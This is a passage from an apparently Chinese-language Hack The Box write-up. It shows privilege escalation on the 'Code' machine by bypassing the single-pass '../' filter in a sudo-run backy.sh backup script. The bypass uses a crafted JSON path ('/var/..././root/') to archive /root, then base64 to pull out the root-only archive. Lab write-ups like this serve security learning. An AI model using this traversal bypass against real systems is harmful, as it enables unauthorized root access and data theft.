+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">martin@code:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> martin on localhost:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User martin may run the following commands on localhost:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/backy.sh
+</span></span><span class="line"><span class="cl">martin@code:~$ ls -la /usr/bin/backy.sh
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">926</span> Sep <span class="m">16</span>  <span class="m">2024</span> /usr/bin/backy.sh
+</span></span><span class="line"><span class="cl">martin@code:~$ cat /usr/bin/backy.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="nv">$#</span> -ne <span class="m">1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/echo <span class="s2">&#34;Usage: </span><span class="nv">$0</span><span class="s2"> &lt;task.json&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">json_file</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> ! -f <span class="s2">&#34;</span><span class="nv">$json_file</span><span class="s2">&#34;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/echo <span class="s2">&#34;Error: File &#39;</span><span class="nv">$json_file</span><span class="s2">&#39; not found.&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">allowed_paths</span><span class="o">=(</span><span class="s2">&#34;/var/&#34;</span> <span class="s2">&#34;/home/&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">updated_json</span><span class="o">=</span><span class="k">$(</span>/usr/bin/jq <span class="s1">&#39;.directories_to_archive |= map(gsub(&#34;\\.\\./&#34;; &#34;&#34;))&#39;</span> <span class="s2">&#34;</span><span class="nv">$json_file</span><span class="s2">&#34;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/bin/echo <span class="s2">&#34;</span><span class="nv">$updated_json</span><span class="s2">&#34;</span> &gt; <span class="s2">&#34;</span><span class="nv">$json_file</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">directories_to_archive</span><span class="o">=</span><span class="k">$(</span>/usr/bin/echo <span class="s2">&#34;</span><span class="nv">$updated_json</span><span class="s2">&#34;</span> <span class="p">|</span> /usr/bin/jq -r <span class="s1">&#39;.directories_to_archive[]&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">is_allowed_path<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">path</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> allowed_path in <span class="s2">&#34;</span><span class="si">${</span><span class="nv">allowed_paths</span><span class="p">[@]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$path</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="nv">$allowed_path</span>* <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">    <span class="k">done</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> dir in <span class="nv">$directories_to_archive</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> ! is_allowed_path <span class="s2">&#34;</span><span class="nv">$dir</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">        /usr/bin/echo <span class="s2">&#34;Error: </span><span class="nv">$dir</span><span class="s2"> is not allowed. Only directories under /var/ and /home/ are allowed.&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/bin/backy <span class="s2">&#34;</span><span class="nv">$json_file</span><span class="s2">&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>哎，这个其实是一个开源的东西，github可以找到，类似备份，可以看到禁用了目录穿越，但是只是替换成空格，那么<code>双写绕过</code>就行了，除了这个方法，还可以写<code>.json</code>老老实实的写</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;destination&#34;</span><span class="p">:</span> <span class="s2">&#34;/home/martin/backups&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;verbose_log&#34;</span><span class="p">:</span> <span class="bp">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;directories_to_sync&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;/var/../root/&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;directories_to_archive&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;/var/..././root/&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>去读<code>root</code>的全部路径到<code>backup</code>，然后发现生成的<code>.tar.gz2</code>包<code>root</code>才可以读，哎，怎么办呢？
+<code>base64</code>是个伟大的东西，可以把整个文件转成base64，然后去本地解密成<code>.tar.gz2</code>，也就是<code>base64 -d encoded.txt &gt; 1.tar.gz2</code>，然后解压得到flag</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-03-24</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/htb-alert_and_linkvortex_and_code/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://www.zhuangsanmeng.xyz/htb-alert_and_linkvortex_and_code/" data-title="HTB Alert&amp;LinkVortex&amp;code" data-hashtags="渗透"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://www.zhuangsanmeng.xyz/htb-alert_and_linkvortex_and_code/" data-hashtag="渗透"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://www.zhuangsanmeng.xyz/htb-alert_and_linkvortex_and_code/" data-title="HTB Alert&amp;LinkVortex&amp;code"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://www.zhuangsanmeng.xyz/htb-alert_and_linkvortex_and_code/" data-title="HTB Alert&amp;LinkVortex&amp;code"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://www.zhuangsanmeng.xyz/htb-alert_and_linkvortex_and_code/" data-title="HTB Alert&amp;LinkVortex&amp;code"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2025polarctf/" class="prev" rel="prev" title="2025PolarCTF春季赛"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>2025PolarCTF春季赛</a>
+            <a href="/study_nodejs1/" class="next" rel="next" title="Study Nodejs「1」">Study Nodejs「1」<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src=''></script>
+
+    <script type="text/javascript">
+        new Valine({
+            el: '#valine',
+            appId: 'XiJ1G58psCdX6BgfE27O7IH9-MdYXbMMI',
+            appKey: 'e9j5fWZui0l2YfNwupu7SDW2',
+            notify: '',
+            verify: '',
+            avatar: 'mp',
+            placeholder: '留下你的评论～',
+            visitor: 'true'
+        });
+    </script></div></article></div>
+            </main><footer class="footer">
+    <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer"
+                title="Hugo 0.147.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank"
+                rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw"
+                    aria-hidden="true"></i> LoveIt</a>
+        </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a
+                    href="/" target="_blank">Zsm</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br" />
+            <span class="icp">豫ICP备2024048128号</span></div>
+    
+        
+        <script async src=" //busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js "></script>
+    
+
+    
+        
+            <section>
+                
+                    <span id="busuanzi_container_value_site_pv"><i class="far fa-eye fa-fw"></i>
+                        
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+
+                
+                    &nbsp;|&nbsp;              
+                
+
+                
+                    <span id="busuanzi_container_value_site_uv"><i class="fa fa-user"></i>
+                        
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+            </section>
+        
+
+        
+        
+    
+
+</div>
+</footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
